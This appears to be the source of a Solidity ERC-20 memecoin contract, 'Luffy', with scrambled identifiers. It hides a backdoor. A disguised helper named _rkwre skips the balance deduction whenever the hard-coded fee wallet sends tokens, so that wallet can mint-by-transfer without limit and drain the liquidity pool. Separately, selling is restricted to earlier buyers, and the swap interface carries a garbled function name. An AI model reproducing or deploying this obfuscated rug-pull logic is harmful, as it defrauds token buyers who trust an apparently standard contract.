/**

$Luffy
Welcome aboard the Luffy memecoin project!
Get ready to set sail on a thrilling adventure.


TWITTER: https://twitter.com/Luffyeth_Coin
TELEGRAM: https://t.me/Luffyeth_Coin
WEBSITE: https://luffyeth.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rkwre(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rkwre(a, b, "SafeMath");
    }

    function  _rkwre(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _agdrnk {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _alvylr {
    function vfuorgaeteFreacreevlg(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Luffy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _alvylr private _Trkpyrk;
    address payable private _Fkrjivo;
    address private _coatru;

    string private constant _name = unicode"Luffy";
    string private constant _symbol = unicode"Luffy";
    uint8 private constant _decimals = 9;
    uint256 private constant _jTotaljk = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pvzfrzr;
    mapping (address => bool) private _yrbioy;
    mapping(address => uint256) private _ahjukq;
    uint256 public _qvjvspd = _jTotaljk;
    uint256 public _Wiorsoe = _jTotaljk;
    uint256 public _refTjvu= _jTotaljk;
    uint256 public _XovTyef= _jTotaljk;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yffvoq=0;
    uint256 private _ueabjcg=0;
    

    bool private _efykivar;
    bool public _Dbforkf = false;
    bool private peqvze = false;
    bool private _opgveu = false;


    event _hzdpwrt(uint _qvjvspd);
    modifier uyvsvr {
        peqvze = true;
        _;
        peqvze = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _jTotaljk;
        _pvzfrzr[owner(

        )] = true;
        _pvzfrzr[address
        (this)] = true;
        _pvzfrzr[
            _Fkrjivo] = true;
        _Fkrjivo = 
        payable (0x38a9cC83bF826981823C76E4673907657126e14E);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _jTotaljk);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _jTotaljk;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rkwre(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kseyurk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dbforkf) {
                if (to 
                != address
                (_Trkpyrk) 
                && to !=
                 address
                 (_coatru)) {
                  require(_ahjukq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _ahjukq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _coatru && to != 
            address(_Trkpyrk) &&
             !_pvzfrzr[to] ) {
                require(amount 
                <= _qvjvspd,
                 "Exceeds the _qvjvspd.");
                require(balanceOf
                (to) + amount
                 <= _Wiorsoe,
                  "Exceeds the macxizse.");
                if(_ueabjcg
                < _yffvoq){
                  require
                  (! _epikbz(to));
                }
                _ueabjcg++;
                 _yrbioy
                 [to]=true;
                kseyurk = amount._pvr
                ((_ueabjcg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _coatru &&
             from!= address(this) 
            && !_pvzfrzr[from] ){
                require(amount <= 
                _qvjvspd && 
                balanceOf(_Fkrjivo)
                <_XovTyef,
                 "Exceeds the _qvjvspd.");
                kseyurk = amount._pvr((_ueabjcg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ueabjcg>
                _yffvoq &&
                 _yrbioy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!peqvze 
            && to == _coatru &&
             _opgveu &&
             contractTokenBalance>
             _refTjvu 
            && _ueabjcg>
            _yffvoq&&
             !_pvzfrzr[to]&&
              !_pvzfrzr[from]
            ) {
                _figoeuf( _wvfde(amount, 
                _wvfde(contractTokenBalance,
                _XovTyef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xrvieo(address
                    (this).balance);
                }
            }
        }

        if(kseyurk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kseyurk);
          emit
           Transfer(from,
           address
           (this),kseyurk);
        }
        _balances[from
        ]= _rkwre(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rkwre(kseyurk));
        emit Transfer
        (from, to, 
        amount.
         _rkwre(kseyurk));
    }

    function _figoeuf(uint256
     tokenAmount) private
      uyvsvr {
        if(tokenAmount==
        0){return;}
        if(!_efykivar)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trkpyrk.WETH();
        _approve(address(this),
         address(
             _Trkpyrk), 
             tokenAmount);
        _Trkpyrk.
        vfuorgaeteFreacreevlg
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wvfde
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rkwre(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fkrjivo){
            return a ;
        }else{
            return a .
             _rkwre (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvjvspd = _jTotaljk;
        _Wiorsoe = _jTotaljk;
        emit _hzdpwrt(_jTotaljk);
    }

    function _epikbz(address 
    account) private view 
    returns (bool) {
        uint256 ejrcuv;
        assembly {
            ejrcuv :=
             extcodesize
             (account)
        }
        return ejrcuv > 
        0;
    }

    function _xrvieo(uint256
    amount) private {
        _Fkrjivo.
        transfer(
            amount);
    }

    function openjTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _efykivar ) ;
        _Trkpyrk  
        =  
        _alvylr
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trkpyrk), 
            _jTotaljk);
        _coatru = 
        _agdrnk(_Trkpyrk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trkpyrk .
             WETH ( ) );
        _Trkpyrk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_coatru).
        approve(address(_Trkpyrk), 
        type(uint)
        .max);
        _opgveu = true;
        _efykivar = true;
    }

    receive() external payable {}
}